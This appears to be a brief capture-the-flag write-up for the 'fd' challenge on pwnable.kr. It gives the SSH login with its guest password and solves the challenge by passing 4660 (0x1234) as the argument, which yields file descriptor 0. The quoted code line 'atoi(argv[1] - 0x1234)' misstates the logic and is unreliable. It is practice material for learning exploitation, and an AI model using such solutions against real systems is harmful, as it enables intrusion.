# fd 

---

ssh fd@pwnable.kr -p2222 (pw:guest)


## Exploitation

```
atoi(argv[1] - 0x1234)


python -c "print 0x1234" # 4660

```

so 

```
./fd 4660
```
